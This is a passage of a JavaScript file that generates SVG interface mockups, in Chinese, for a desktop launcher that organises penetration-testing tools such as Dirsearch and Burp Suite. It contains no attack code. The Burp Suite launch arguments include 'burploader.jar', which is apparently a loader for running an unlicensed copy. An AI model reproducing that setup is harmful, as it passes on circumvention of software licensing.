      <path d="M4 8h16M4 12h16" transform="translate(8, 6) scale(0.6)" stroke="#475569" stroke-width="2"/>
      <rect x="14" y="18" width="36" height="36" rx="6" fill="#F59E0B" fill-opacity="0.2"/>
      <text x="32" y="42" text-anchor="middle" class="font-sans" font-size="18" font-weight="800" fill="#FBBF24">D</text>
      <text x="58" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Dirsearch 目录爆破</text>
      <rect x="58" y="38" width="52" height="16" rx="4" fill="#A855F7" fill-opacity="0.15"/>
      <text x="84" y="50" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#C084FC">SCRIPT</text>
      <text x="294" y="34" font-size="16" fill="#475569">☆</text>
      <text x="14" y="76" class="font-sans" font-size="11" fill="#94A3B8">高级 Web 路径与隐藏文件多线程扫描工具</text>
      <g transform="translate(14, 88)">
        <rect x="0" y="0" width="48" height="18" rx="4" fill="#1E293B"/>
        <text x="24" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#FBBF24">#Fuzz</text>
        <rect x="54" y="0" width="62" height="18" rx="4" fill="#1E293B"/>
        <text x="85" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#FBBF24">#Python</text>
      </g>
      <line x1="0" y1="122" x2="318" y2="122" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="142" class="font-mono" font-size="10" fill="#64748B">python dirsearch.py</text>
      <g transform="translate(14, 146)">
        <rect x="0" y="0" width="130" height="24" rx="4" fill="url(#emeraldGradient)"/>
        <text x="65" y="16" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">&gt;_ 终端运行</text>
        <rect x="140" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M8 4v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7.242a2 2 0 0 0-.602-1.43L16.083 2.57A2 2 0 0 0 14.685 2H10a2 2 0 0 0-2 2z" transform="translate(144, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="176" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <path d="M12 20h9M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" transform="translate(180, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
        <rect x="212" y="0" width="76" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="250" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#94A3B8">··· 菜单</text>
      </g>
    </g>
  </g>

  <!-- Bottom Pagination & Hint Bar -->
  <g transform="translate(264, 738)">
    <text x="0" y="18" class="font-sans" font-size="11" fill="#64748B">显示 1 - 6 / 共 48 款安全工具</text>
    <!-- Pagination -->
    <g transform="translate(380, 0)">
      <rect x="0" y="0" width="30" height="26" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
      <text x="15" y="17" text-anchor="middle" class="font-sans" font-size="11" fill="#94A3B8">&lt;</text>
      <!-- Page 1 Active -->
      <rect x="36" y="0" width="28" height="26" rx="4" fill="#0EA5E9"/>
      <text x="50" y="17" text-anchor="middle" class="font-mono" font-size="11" font-weight="700" fill="#FFFFFF">1</text>
      <!-- Page 2 -->
      <rect x="70" y="0" width="28" height="26" rx="4" fill="#1E293B"/>
      <text x="84" y="17" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">2</text>
      <!-- Page 3 -->
      <rect x="104" y="0" width="28" height="26" rx="4" fill="#1E293B"/>
      <text x="118" y="17" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">3</text>
      <text x="142" y="17" text-anchor="middle" class="font-sans" font-size="11" fill="#64748B">...</text>
      <!-- Page 8 -->
      <rect x="156" y="0" width="28" height="26" rx="4" fill="#1E293B"/>
      <text x="170" y="17" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">8</text>
      <!-- Next -->
      <rect x="190" y="0" width="30" height="26" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
      <text x="205" y="17" text-anchor="middle" class="font-sans" font-size="11" fill="#94A3B8">&gt;</text>
    </g>
    <!-- Right Tip -->
    <text x="992" y="18" text-anchor="end" class="font-sans" font-size="11" fill="#64748B">按住卡片拖拽手柄可自由排序 · 按住 Shift 可多选批量处理</text>
  </g>
</svg>`;
}

console.log('All Tools SVG generator compiled.');

function generateCategoriesSvg() {
  return `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 800" width="1280" height="800">
  ${SVG_DEFS}
  <rect width="1280" height="800" rx="10" fill="#0B0F17" stroke="#1E293B" stroke-width="1.5"/>

  ${renderWindowHeader()}
  ${renderSidebar('categories')}

  <!-- Main Content Area: Categories & Tags (1040 x 760) -->
  <!-- Top Title Banner -->
  <g transform="translate(264, 52)">
    <text x="0" y="24" class="font-sans" font-size="18" font-weight="700" fill="#F8FAFC">分类与标签治理中心 (Taxonomy Studio)</text>
    <text x="0" y="44" class="font-sans" font-size="11" fill="#94A3B8">规划网络安全军火库层级树，统一治理分类色彩标示与标签资产池</text>
  </g>

  <!-- 2-Column Split Layout (Y: 110, H: 660) -->
  <g transform="translate(264, 110)">
    <!-- LEFT COLUMN: Categories Tree & Management (Width 530px) -->
    <g transform="translate(0, 0)">
      <rect x="0" y="0" width="530" height="660" rx="8" fill="#111827" stroke="#1E293B" stroke-width="1"/>

      <!-- Header of Left Col -->
      <g transform="translate(18, 16)">
        <!-- Folder Icon -->
        <path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2z" transform="translate(0, 2) scale(0.85)" fill="none" stroke="#38BDF8" stroke-width="1.8"/>
        <text x="24" y="16" class="font-sans" font-size="14" font-weight="700" fill="#F8FAFC">分类层级体系 (共 8 个分类)</text>
        <!-- Action Buttons on Right -->
        <g transform="translate(370, 0)">
          <rect x="0" y="0" width="124" height="28" rx="4" fill="url(#cyanGradient)"/>
          <path d="M12 5v14m-7-7h14" transform="translate(10, 5) scale(0.75)" fill="none" stroke="#FFFFFF" stroke-width="2" stroke-linecap="round"/>
          <text x="32" y="18" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">新建主分类</text>
        </g>
      </g>
      <line x1="0" y1="56" x2="530" y2="56" stroke="#1E293B" stroke-width="1"/>

      <!-- Category List Items (Draggable) -->
      <!-- Category 1: Web Pentest -->
      <g transform="translate(18, 68)">
        <rect x="0" y="0" width="494" height="62" rx="6" fill="#162032" stroke="#0EA5E9" stroke-width="1" stroke-opacity="0.6"/>
        <!-- Drag Handle -->
        <path d="M4 8h16M4 12h16" transform="translate(10, 20) scale(0.7)" stroke="#64748B" stroke-width="2"/>
        <!-- Color Dot & Icon -->
        <circle cx="36" cy="31" r="5" fill="#0EA5E9"/>
        <text x="50" y="28" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Web 渗透测试 (Web Pentest)</text>
        <text x="50" y="46" class="font-sans" font-size="11" fill="#64748B">包含: 抓包代理、SQL注入、文件上传、XSS利用</text>
        <!-- Tools Badge -->
        <rect x="330" y="20" width="58" height="22" rx="11" fill="#0EA5E9" fill-opacity="0.15"/>
        <text x="359" y="35" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#38BDF8">16 款</text>
        <!-- Actions -->
        <rect x="398" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="419" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">编辑</text>
        <rect x="446" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="467" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#EF4444">删除</text>
      </g>

      <!-- Category 2: Reconnaissance -->
      <g transform="translate(18, 138)">
        <rect x="0" y="0" width="494" height="62" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
        <path d="M4 8h16M4 12h16" transform="translate(10, 20) scale(0.7)" stroke="#64748B" stroke-width="2"/>
        <circle cx="36" cy="31" r="5" fill="#10B981"/>
        <text x="50" y="28" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">信息收集与探测 (Reconnaissance)</text>
        <text x="50" y="46" class="font-sans" font-size="11" fill="#64748B">包含: 端口扫描、子域名爆破、空间测绘、指纹识别</text>
        <rect x="330" y="20" width="58" height="22" rx="11" fill="#10B981" fill-opacity="0.15"/>
        <text x="359" y="35" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#34D399">12 款</text>
        <rect x="398" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="419" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">编辑</text>
        <rect x="446" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="467" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#EF4444">删除</text>
      </g>

      <!-- Category 3: Vuln Scan -->
      <g transform="translate(18, 208)">
        <rect x="0" y="0" width="494" height="62" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
        <path d="M4 8h16M4 12h16" transform="translate(10, 20) scale(0.7)" stroke="#64748B" stroke-width="2"/>
        <circle cx="36" cy="31" r="5" fill="#F59E0B"/>
        <text x="50" y="28" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">漏洞扫描与评估 (Vulnerability Scanning)</text>
        <text x="50" y="46" class="font-sans" font-size="11" fill="#64748B">包含: PoC/Exp 框架、通用漏洞扫描、弱口令探测</text>
        <rect x="330" y="20" width="58" height="22" rx="11" fill="#F59E0B" fill-opacity="0.15"/>
        <text x="359" y="35" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#FBBF24">8 款</text>
        <rect x="398" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="419" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">编辑</text>
        <rect x="446" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="467" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#EF4444">删除</text>
      </g>

      <!-- Category 4: Reverse Eng -->
      <g transform="translate(18, 278)">
        <rect x="0" y="0" width="494" height="62" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
        <path d="M4 8h16M4 12h16" transform="translate(10, 20) scale(0.7)" stroke="#64748B" stroke-width="2"/>
        <circle cx="36" cy="31" r="5" fill="#A855F7"/>
        <text x="50" y="28" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">逆向与二进制分析 (Reverse Engineering)</text>
        <text x="50" y="46" class="font-sans" font-size="11" fill="#64748B">包含: 反编译器、动态调试器、固件提取、脱壳分析</text>
        <rect x="330" y="20" width="58" height="22" rx="11" fill="#A855F7" fill-opacity="0.15"/>
        <text x="359" y="35" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#C084FC">5 款</text>
        <rect x="398" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="419" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">编辑</text>
        <rect x="446" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="467" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#EF4444">删除</text>
      </g>

      <!-- Category 5: Privilege Escalation -->
      <g transform="translate(18, 348)">
        <rect x="0" y="0" width="494" height="62" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
        <path d="M4 8h16M4 12h16" transform="translate(10, 20) scale(0.7)" stroke="#64748B" stroke-width="2"/>
        <circle cx="36" cy="31" r="5" fill="#EF4444"/>
        <text x="50" y="28" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">权限提升与横向移动 (Privilege Escalation)</text>
        <text x="50" y="46" class="font-sans" font-size="11" fill="#64748B">包含: Linux/Windows 提权脚本、域渗透套件、凭据提取</text>
        <rect x="330" y="20" width="58" height="22" rx="11" fill="#EF4444" fill-opacity="0.15"/>
        <text x="359" y="35" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#F87171">4 款</text>
        <rect x="398" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="419" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">编辑</text>
        <rect x="446" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="467" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#EF4444">删除</text>
      </g>

      <!-- Category 6: Incident Response -->
      <g transform="translate(18, 418)">
        <rect x="0" y="0" width="494" height="62" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
        <path d="M4 8h16M4 12h16" transform="translate(10, 20) scale(0.7)" stroke="#64748B" stroke-width="2"/>
        <circle cx="36" cy="31" r="5" fill="#3B82F6"/>
        <text x="50" y="28" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">应急响应与电子取证 (Incident Response)</text>
        <text x="50" y="46" class="font-sans" font-size="11" fill="#64748B">包含: 内存取证、流量溯源、日志审计、自启动排查</text>
        <rect x="330" y="20" width="58" height="22" rx="11" fill="#3B82F6" fill-opacity="0.15"/>
        <text x="359" y="35" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#60A5FA">3 款</text>
        <rect x="398" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="419" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#94A3B8">编辑</text>
        <rect x="446" y="19" width="42" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
        <text x="467" y="35" text-anchor="middle" class="font-sans" font-size="10" fill="#EF4444">删除</text>
      </g>

      <!-- Bottom Hint of Left Col -->
      <g transform="translate(18, 620)">
        <rect x="0" y="0" width="494" height="28" rx="4" fill="#0B0F17"/>
        <text x="14" y="18" class="font-sans" font-size="11" fill="#64748B">💡 提示: 拖拽调整顺序将即时同步至左侧导航栏与仪表盘快捷入口</text>
      </g>
    </g>

    <!-- RIGHT COLUMN: Tags Management Pool (Width 440px) -->
    <g transform="translate(550, 0)">
      <rect x="0" y="0" width="440" height="660" rx="8" fill="#111827" stroke="#1E293B" stroke-width="1"/>

      <!-- Header of Right Col -->
      <g transform="translate(18, 16)">
        <path d="M7 7h.01M7 3h10a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z" transform="translate(0, 2) scale(0.85)" fill="none" stroke="#F59E0B" stroke-width="1.8"/>
        <text x="24" y="16" class="font-sans" font-size="14" font-weight="700" fill="#F8FAFC">标签资产池 (共 24 个标签)</text>
      </g>
      <line x1="0" y1="56" x2="440" y2="56" stroke="#1E293B" stroke-width="1"/>

      <!-- Quick Add Tag Input Bar -->
      <g transform="translate(18, 68)">
        <rect x="0" y="0" width="230" height="34" rx="6" fill="#162032" stroke="#334155" stroke-width="1"/>
        <text x="14" y="22" class="font-sans" font-size="11" fill="#64748B">输入新标签名称 (如 #ActiveDirectory)</text>
        <!-- Color Picker Pill -->
        <g transform="translate(240, 0)">
          <rect x="0" y="0" width="70" height="34" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
          <circle cx="16" cy="17" r="5" fill="#0EA5E9"/>
          <text x="28" y="21" class="font-sans" font-size="11" fill="#CBD5E1">色彩 ▾</text>
        </g>
        <!-- Add Button -->
        <g transform="translate(320, 0)">
          <rect x="0" y="0" width="84" height="34" rx="6" fill="url(#cyanGradient)"/>
          <text x="42" y="21" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">+ 添加</text>
        </g>
      </g>

      <!-- Tag Cloud Matrix -->
      <g transform="translate(18, 120)">
        <text x="0" y="0" class="font-sans" font-size="11" font-weight="700" fill="#64748B">已有标签矩阵 (点击可选中并维护):</text>

        <!-- Row 1 -->
        <g transform="translate(0, 12)">
          <!-- Selected Tag: #Web -->
          <rect x="0" y="0" width="84" height="28" rx="6" fill="#0EA5E9" fill-opacity="0.2" stroke="#0EA5E9" stroke-width="1.5"/>
          <text x="42" y="18" text-anchor="middle" class="font-mono" font-size="11" font-weight="700" fill="#38BDF8">#Web (18)</text>

          <rect x="92" y="0" width="105" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="144" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Python3 (14)</text>

          <rect x="205" y="0" width="82" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="246" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#GUI (22)</text>

          <rect x="295" y="0" width="80" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="335" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#CLI (16)</text>
        </g>

        <!-- Row 2 -->
        <g transform="translate(0, 48)">
          <rect x="0" y="0" width="94" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="47" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Recon (12)</text>

          <rect x="102" y="0" width="84" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="144" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Proxy (8)</text>

          <rect x="194" y="0" width="76" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="232" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Java (6)</text>

          <rect x="278" y="0" width="76" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="316" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#PoC (7)</text>
        </g>

        <!-- Row 3 -->
        <g transform="translate(0, 84)">
          <rect x="0" y="0" width="96" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="48" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Exploit (5)</text>

          <rect x="104" y="0" width="96" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="152" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Reverse (5)</text>

          <rect x="208" y="0" width="96" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="256" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Traffic (4)</text>
        </g>

        <!-- Row 4 -->
        <g transform="translate(0, 120)">
          <rect x="0" y="0" width="88" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="44" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#OSINT (6)</text>

          <rect x="96" y="0" width="96" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="144" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Fuzzing (4)</text>

          <rect x="200" y="0" width="108" height="28" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="254" y="18" text-anchor="middle" class="font-mono" font-size="11" fill="#94A3B8">#Password (3)</text>
        </g>
      </g>

      <!-- Selected Tag Inspector & Detail Card -->
      <g transform="translate(18, 300)">
        <rect x="0" y="0" width="404" height="220" rx="8" fill="#162032" stroke="#334155" stroke-width="1"/>
        <text x="16" y="28" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">当前选中的标签资产详情</text>
        <line x1="0" y1="42" x2="404" y2="42" stroke="#1E293B" stroke-width="1"/>

        <!-- Details -->
        <text x="16" y="68" class="font-sans" font-size="12" fill="#94A3B8">标签名:</text>
        <rect x="76" y="52" width="70" height="24" rx="4" fill="#0EA5E9" fill-opacity="0.2"/>
        <text x="111" y="68" text-anchor="middle" class="font-mono" font-size="11" font-weight="700" fill="#38BDF8">#Web</text>

        <text x="16" y="104" class="font-sans" font-size="12" fill="#94A3B8">主题色系:</text>
        <circle cx="86" cy="100" r="6" fill="#0EA5E9"/>
        <text x="100" y="104" class="font-mono" font-size="11" fill="#CBD5E1">Cyber Cyan (#0EA5E9)</text>

        <text x="16" y="140" class="font-sans" font-size="12" fill="#94A3B8">关联工具:</text>
        <text x="76" y="140" class="font-sans" font-size="12" font-weight="600" fill="#F8FAFC">共 18 款安全工具正在引用该标签</text>

        <!-- Action Buttons -->
        <g transform="translate(16, 166)">
          <rect x="0" y="0" width="115" height="34" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
          <text x="57" y="21" text-anchor="middle" class="font-sans" font-size="11" fill="#CBD5E1">✏ 重命名标签</text>

          <rect x="125" y="0" width="125" height="34" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
          <text x="187" y="21" text-anchor="middle" class="font-sans" font-size="11" fill="#CBD5E1">⇄ 合并至其他标签</text>

          <rect x="260" y="0" width="112" height="34" rx="6" fill="#1E293B" stroke="#EF4444" stroke-width="0.8"/>
          <text x="316" y="21" text-anchor="middle" class="font-sans" font-size="11" fill="#EF4444">🗑 删除标签</text>
        </g>
      </g>

      <!-- Bottom Hint of Right Col -->
      <g transform="translate(18, 620)">
        <rect x="0" y="0" width="404" height="28" rx="4" fill="#0B0F17"/>
        <text x="14" y="18" class="font-sans" font-size="11" fill="#64748B">清理 0 引用标签可精简工具过滤时的胶囊选择项</text>
      </g>
    </g>
  </g>
  ${renderStatusBar('categories')}
</svg>`;
}
console.log('Categories SVG generator compiled.');

function generateAddEditToolSvg() {
  return `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 800" width="1280" height="800">
  ${SVG_DEFS}
  <rect width="1280" height="800" rx="10" fill="#0B0F17" stroke="#1E293B" stroke-width="1.5"/>

  ${renderWindowHeader()}
  ${renderSidebar('add_tool')}

  <!-- Main Content Area: Add/Edit Tool Studio (1040 x 760) -->
  <!-- Top Breadcrumb & Action Bar -->
  <g transform="translate(264, 52)">
    <!-- Breadcrumb -->
    <text x="0" y="24" class="font-sans" font-size="12" fill="#64748B">全部工具  &gt;  <tspan fill="#F8FAFC" font-weight="700" font-size="14">编辑工具: Burp Suite Professional</tspan></text>
    <text x="0" y="44" class="font-sans" font-size="11" fill="#94A3B8">配置工具属性、底层可执行程序绝对路径、启动参数与所属标签资产</text>

    <!-- Header Actions (Right) -->
    <g transform="translate(680, 8)">
      <rect x="0" y="0" width="80" height="34" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
      <text x="40" y="21" text-anchor="middle" class="font-sans" font-size="11" fill="#CBD5E1">取消 (Esc)</text>

      <rect x="90" y="0" width="80" height="34" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
      <text x="130" y="21" text-anchor="middle" class="font-sans" font-size="11" fill="#CBD5E1">重置修改</text>

      <rect x="180" y="0" width="132" height="34" rx="6" fill="url(#cyanGradient)" filter="url(#cyanGlow)"/>
      <path d="M5 13l4 4L19 7" transform="translate(192, 7) scale(0.85)" fill="none" stroke="#FFFFFF" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
      <text x="250" y="21" text-anchor="middle" class="font-sans" font-size="12" font-weight="700" fill="#FFFFFF">保存工具 (Ctrl+S)</text>
    </g>
  </g>

  <!-- 2-Column Split Layout (Y: 108, H: 665) -->
  <g transform="translate(264, 108)">
    <!-- LEFT COLUMN: Form Fields (Width 600px) -->
    <g transform="translate(0, 0)">
      <rect x="0" y="0" width="600" height="665" rx="8" fill="#111827" stroke="#1E293B" stroke-width="1"/>

      <!-- Form Section 1: Basic Info -->
      <g transform="translate(20, 16)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">1. 基础元信息 (BASIC INFO)</text>
        <line x1="0" y1="24" x2="560" y2="24" stroke="#1E293B" stroke-width="1"/>

        <!-- Tool Name -->
        <text x="0" y="44" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">工具名称 <tspan fill="#EF4444">*</tspan></text>
        <rect x="0" y="52" width="270" height="34" rx="6" fill="#162032" stroke="#0EA5E9" stroke-width="1.2"/>
        <text x="12" y="74" class="font-sans" font-size="12" fill="#F8FAFC">Burp Suite Professional</text>

        <!-- Icon Selector -->
        <text x="290" y="44" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">工具图标</text>
        <rect x="290" y="52" width="270" height="34" rx="6" fill="#162032" stroke="#334155" stroke-width="1"/>
        <circle cx="310" cy="69" r="8" fill="#F97316" fill-opacity="0.3"/>
        <text x="310" y="73" text-anchor="middle" class="font-sans" font-size="10" font-weight="800" fill="#FB923C">B</text>
        <text x="328" y="74" class="font-sans" font-size="11" fill="#CBD5E1">内置橙色盾标 (点击更改 ▾)</text>

        <!-- Description -->
        <text x="0" y="106" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">一句话描述</text>
        <rect x="0" y="114" width="560" height="34" rx="6" fill="#162032" stroke="#334155" stroke-width="1"/>
        <text x="12" y="136" class="font-sans" font-size="11" fill="#CBD5E1">企业级 Web 应用安全测试、抓包代理与自动化攻击评估平台</text>
      </g>

      <!-- Form Section 2: Type Selection (Radio Pills) -->
      <g transform="translate(20, 185)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">2. 运行类型 (EXECUTION TYPE) <tspan fill="#EF4444">*</tspan></text>
        <line x1="0" y1="24" x2="560" y2="24" stroke="#1E293B" stroke-width="1"/>

        <!-- Type Radios -->
        <g transform="translate(0, 34)">
          <!-- Web Link -->
          <rect x="0" y="0" width="130" height="36" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="65" y="22" text-anchor="middle" class="font-sans" font-size="11" fill="#94A3B8">○ 在线网页 (Web)</text>

          <!-- Local Executable (Active) -->
          <rect x="140" y="0" width="145" height="36" rx="6" fill="#0EA5E9" fill-opacity="0.15" stroke="#0EA5E9" stroke-width="1.5"/>
          <text x="212" y="22" text-anchor="middle" class="font-sans" font-size="11" font-weight="700" fill="#38BDF8">● 本地程序 (Local GUI)</text>

          <!-- Script -->
          <rect x="295" y="0" width="130" height="36" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="360" y="22" text-anchor="middle" class="font-sans" font-size="11" fill="#94A3B8">○ 自动化脚本 (Script)</text>

          <!-- Memo -->
          <rect x="435" y="0" width="125" height="36" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <text x="497" y="22" text-anchor="middle" class="font-sans" font-size="11" fill="#94A3B8">○ 安全备忘 (Memo)</text>
        </g>
      </g>

      <!-- Form Section 3: Local Executable Specifics -->
      <g transform="translate(20, 275)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">3. 本地启动参数配置 (LAUNCH CONFIG)</text>
        <line x1="0" y1="24" x2="560" y2="24" stroke="#1E293B" stroke-width="1"/>

        <!-- Executable Path -->
        <text x="0" y="44" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">可执行文件绝对路径 <tspan fill="#EF4444">*</tspan></text>
        <rect x="0" y="52" width="430" height="34" rx="6" fill="#162032" stroke="#334155" stroke-width="1"/>
        <text x="12" y="74" class="font-mono" font-size="11" fill="#F8FAFC">D:\\SecTools\\BurpSuite\\BurpSuitePro.exe</text>
        <!-- Browse File Button -->
        <g transform="translate(440, 52)">
          <rect x="0" y="0" width="120" height="34" rx="6" fill="#1E293B" stroke="#0EA5E9" stroke-width="1"/>
          <!-- Folder Icon -->
          <path d="M2 5a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z" transform="translate(14, 8) scale(0.85)" fill="none" stroke="#38BDF8" stroke-width="1.8"/>
          <text x="64" y="22" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#38BDF8">浏览文件...</text>
        </g>

        <!-- Working Directory -->
        <text x="0" y="104" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">自定义工作目录 (Working Directory - 默认同目录)</text>
        <rect x="0" y="112" width="560" height="34" rx="6" fill="#162032" stroke="#334155" stroke-width="1"/>
        <text x="12" y="134" class="font-mono" font-size="11" fill="#94A3B8">D:\\SecTools\\BurpSuite</text>

        <!-- Launch Arguments -->
        <text x="0" y="164" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">启动运行参数 (Arguments - 支持传参及内存调优)</text>
        <rect x="0" y="172" width="560" height="34" rx="6" fill="#162032" stroke="#334155" stroke-width="1"/>
        <text x="12" y="194" class="font-mono" font-size="11" fill="#38BDF8">-Xmx4096m -XX:+UseG1GC -jar burploader.jar</text>
      </g>

      <!-- Form Section 4: Category & Tags -->
      <g transform="translate(20, 500)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">4. 归类与标签治理 (TAXONOMY)</text>
        <line x1="0" y1="24" x2="560" y2="24" stroke="#1E293B" stroke-width="1"/>

        <!-- Category Dropdown -->
        <text x="0" y="44" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">所属安全分类 <tspan fill="#EF4444">*</tspan></text>
        <rect x="0" y="52" width="270" height="34" rx="6" fill="#162032" stroke="#334155" stroke-width="1"/>
        <circle cx="16" cy="69" r="4" fill="#0EA5E9"/>
